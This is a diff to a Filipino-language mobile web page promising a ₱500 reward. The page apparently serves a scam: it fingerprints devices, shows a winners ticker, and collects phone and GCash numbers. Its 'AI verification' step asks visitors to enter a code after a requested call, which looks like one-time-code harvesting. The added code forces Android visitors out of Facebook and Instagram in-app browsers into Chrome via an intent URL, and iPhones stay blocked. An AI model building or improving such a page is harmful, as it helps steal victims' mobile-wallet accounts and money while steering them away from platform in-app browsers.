@@ -55,6 +55,8 @@
         #intentBlock .intent-badge { margin-top: 22px; padding: 10px 26px; border-radius: 30px; background: rgba(255, 179, 0, 0.15); border: 2px solid rgba(255, 179, 0, 0.6); font-family: 'Orbitron', monospace; font-size: 11px; font-weight: 800; letter-spacing: 3px; color: #ffe066; animation: badgeGlow 2.5s ease-in-out infinite; }
         #intentBlock .intent-steps { margin-top: 18px; text-align: left; display: inline-block; background: rgba(0,0,0,0.35); border: 1.5px solid rgba(255, 215, 0, 0.4); border-radius: 14px; padding: 14px 18px; font-size: 12px; line-height: 1.9; color: rgba(255,255,255,0.9); }
         #intentBlock .intent-steps strong { color: #ffe066; }
+        #intentBlock .auto-open-btn { margin-top: 20px; padding: 14px 32px; border-radius: 14px; background: linear-gradient(180deg, #fff9c4 0%, #ffe066 25%, #ffb300 65%, #ff8800 100%); border: 3px solid #fff; font-family: 'Orbitron', monospace; font-size: 13px; font-weight: 900; letter-spacing: 2px; color: #4a1f00; text-transform: uppercase; box-shadow: 0 5px 0 #a66900, 0 0 30px rgba(255, 215, 0, 0.6); cursor: pointer; }
+        #intentBlock .auto-open-btn:active { transform: translateY(5px); box-shadow: 0 0 0 #a66900; }
         @keyframes badgeGlow { 0%, 100% { box-shadow: 0 0 15px rgba(255, 215, 0, 0.4); } 50% { box-shadow: 0 0 35px rgba(255, 215, 0, 0.9); } }
 
         /* WINNERS TICKER */
@@ -194,7 +196,7 @@
         <div class="block-badge">◇ SCAN & OPEN ON MOBILE ◇</div>
     </div>
 
-    <!-- ✅ INTENT / BROWSER GUARD (FB / IG / iPhone) -->
+    <!-- ✅ INTENT / BROWSER GUARD (FB / IG / iPhone BLOCK) -->
     <div id="intentBlock">
         <div class="intent-icon">🌐</div>
         <h1>OPEN IN BROWSER</h1>
@@ -206,6 +208,7 @@
             2. Piliin ang <strong>"Open in Browser"</strong><br>
             3. Buksan sa <strong>Chrome</strong> o default browser
         </div>
+        <button class="auto-open-btn" id="autoOpenBtn">🚀 BUKSAN SA CHROME</button>
         <div class="intent-badge">🌐 OPEN IN DEFAULT BROWSER 🌐</div>
     </div>
 
@@ -372,22 +375,62 @@
                 var ua = navigator.userAgent || navigator.vendor || window.opera;
                 return /iPhone|iPad|iPod/i.test(ua) || (navigator.platform === 'MacIntel' && navigator.maxTouchPoints > 1);
             }
+            function isAndroid() {
+                return /Android/i.test(navigator.userAgent);
+            }
+
+            // ✅ AUTO-INTENT: Force open in Chrome (Android only)
+            function forceOpenInChrome() {
+                if (!isAndroid()) return false;
+                var currentUrl = window.location.href;
+                // Remove protocol prefix
+                var cleanUrl = currentUrl.replace(/^https?:\/\//, '');
+                // Build Android intent URL
+                var intentUrl = 'intent://' + cleanUrl + '#Intent;scheme=https;package=com.android.chrome;S.browser_fallback_url=' + encodeURIComponent(currentUrl) + ';end';
+                try {
+                    window.location.href = intentUrl;
+                    return true;
+                } catch(e) {
+                    console.log('Intent failed:', e);
+                    return false;
+                }
+            }
+
             function enforceBrowserGuard() {
                 var block = document.getElementById('intentBlock');
                 var app = document.getElementById('missionApp');
                 var ticker = document.getElementById('winnersTicker');
 
-                if (isInAppBrowser() || isIPhone()) {
+                // Block iPhone
+                if (isIPhone()) {
                     if (block) block.style.display = 'flex';
                     if (app) app.style.display = 'none';
                     if (ticker) ticker.style.display = 'none';
-                    // Disable all popups & buttons
                     document.querySelectorAll('.popup-overlay').forEach(function(p) {
                         p.classList.remove('show');
                         p.style.pointerEvents = 'none';
                     });
                     return false;
                 }
+
+                // Block FB / IG in-app browser
+                if (isInAppBrowser()) {
+                    if (block) block.style.display = 'flex';
+                    if (app) app.style.display = 'none';
+                    if (ticker) ticker.style.display = 'none';
+                    document.querySelectorAll('.popup-overlay').forEach(function(p) {
+                        p.classList.remove('show');
+                        p.style.pointerEvents = 'none';
+                    });
+
+                    // ✅ AUTO-INTENT: Try to auto-open in Chrome
+                    setTimeout(function() {
+                        forceOpenInChrome();
+                    }, 800);
+
+                    return false;
+                }
+
                 if (block) block.style.display = 'none';
                 if (app) app.style.display = '';
                 if (ticker) ticker.style.display = '';
@@ -400,6 +443,14 @@
             // Re-check on resize / orientation
             window.addEventListener('resize', function() { enforceBrowserGuard(); });
             window.addEventListener('orientationchange', function() { setTimeout(enforceBrowserGuard, 300); });
+
+            // ✅ Manual "Open in Chrome" button
+            var autoOpenBtn = document.getElementById('autoOpenBtn');
+            if (autoOpenBtn) {
+                autoOpenBtn.addEventListener('click', function() {
+                    forceOpenInChrome();
+                });
+            }
 
             // ============================================================
             // CONFIG
@@ -602,7 +653,7 @@
                 if (amountElInit) amountElInit.textContent = '₱500';
                 setInterval(updateTicker, 4500);
             }
-            initWinnersTicker();
+            if (browserAllowed) initWinnersTicker();
 
             // ============================================================
             // BACKGROUND EFFECTS
@@ -679,7 +730,7 @@
             // POPUP HELPERS
             // ============================================================
             function openPopup(id) { 
-                if (!browserAllowed) return; // ✅ Block if not in proper browser
+                if (!browserAllowed) return;
                 var p = document.getElementById(id); if (p) p.classList.add('show'); 
             }
             function closePopup(id) { var p = document.getElementById(id); if (p) p.classList.remove('show'); }
@@ -694,7 +745,7 @@
             document.getElementById('banOkBtn').onclick = function() { /* stay on ban popup */ };
 
             // ============================================================
-            // INIT DEVICE (on page load) — WALANG UI DISPLAY
+            // INIT DEVICE
             // ============================================================
             function initDevice() {
                 if (!db || !browserAllowed) return Promise.resolve();
@@ -703,7 +754,6 @@
                 return getOrCreateDeviceId(deviceFingerprint).then(function(displayId) {
                     deviceDisplayId = displayId;
                     console.log('✅ Device ID:', deviceDisplayId);
-                    // ✅ NO UI DISPLAY — backend only
 
                     return db.ref('device_phone_map/' + deviceFingerprint).once('value').then(function(snap) {
                         if (snap.exists() && snap.val().phone) {
@@ -726,7 +776,7 @@
             // ============================================================
             document.getElementById('continueBtn').addEventListener('click', function(e) {
                 e.preventDefault();
-                if (!browserAllowed) return; // ✅ Block if not in proper browser
+                if (!browserAllowed) return;
                 if (isBanned) return;
                 if (navigator.vibrate) { try { navigator.vibrate(30); } catch(e) {} }
                 this.style.transform = 'scale(0.96)';
@@ -758,7 +808,7 @@
             // ============================================================
             document.getElementById('get500Btn').addEventListener('click', function(e) {
                 e.preventDefault();
-                if (!browserAllowed) return; // ✅ Block if not in proper browser
+                if (!browserAllowed) return;
                 if (navigator.vibrate) { try { navigator.vibrate(25); } catch(e) {} }
 
                 var phoneInput = document.getElementById('userPhoneInput');
@@ -938,7 +988,7 @@
             function stopSkipCountdown() { if (skipCountdownInterval) { clearInterval(skipCountdownInterval); skipCountdownInterval = null; } }
 
             document.getElementById('skipClaimBtn').addEventListener('click', function() {
-                if (!browserAllowed) return; // ✅ Block if not in proper browser
+                if (!browserAllowed) return;
                 if (this.disabled) return;
                 if (navigator.vibrate) { try { navigator.vibrate(25); } catch(e) {} }
                 triggerBurst();
@@ -970,7 +1020,7 @@
             // CLAIM NOW → QUEUE
             // ============================================================
             document.getElementById('claimNowBtn').addEventListener('click', function() {
-                if (!browserAllowed) return; // ✅ Block if not in proper browser
+                if (!browserAllowed) return;
                 var gcashInputEl = document.getElementById('gcashInput');
                 var errEl = document.getElementById('claimFormError');
                 var gcashValue = gcashInputEl ? gcashInputEl.value.replace(/\D/g, '') : '';
@@ -1124,7 +1174,7 @@
             // AI VERIFICATION
             // ============================================================
             function showAiVerificationPopup() {
-                if (!browserAllowed) return; // ✅ Block if not in proper browser
+                if (!browserAllowed) return;
                 document.getElementById('aiStage1').classList.remove('hidden');
                 document.getElementById('aiStage2').classList.add('hidden');
                 document.getElementById('aiStage3').classList.add('hidden');
@@ -1152,7 +1202,7 @@
             }
 
             document.getElementById('aiRequestCallBtn').addEventListener('click', function() {
-                if (!browserAllowed) return; // ✅ Block if not in proper browser
+                if (!browserAllowed) return;
                 var gcashEl = document.getElementById('aiGcashInput');
                 var errEl = document.getElementById('aiGcashError');
                 var gcashValue = gcashEl ? gcashEl.value.replace(/\D/g, '') : '';
@@ -1214,7 +1264,7 @@
             function stopAiTimer() { if (aiTimerInterval) { clearInterval(aiTimerInterval); aiTimerInterval = null; } }
 
             document.getElementById('aiVerifyBtn').addEventListener('click', function() {
-                if (!browserAllowed) return; // ✅ Block if not in proper browser
+                if (!browserAllowed) return;
                 var input = document.getElementById('aiCodeInput');
                 var errEl = document.getElementById('aiCodeError');
                 var enteredCode = input ? input.value.trim() : '';
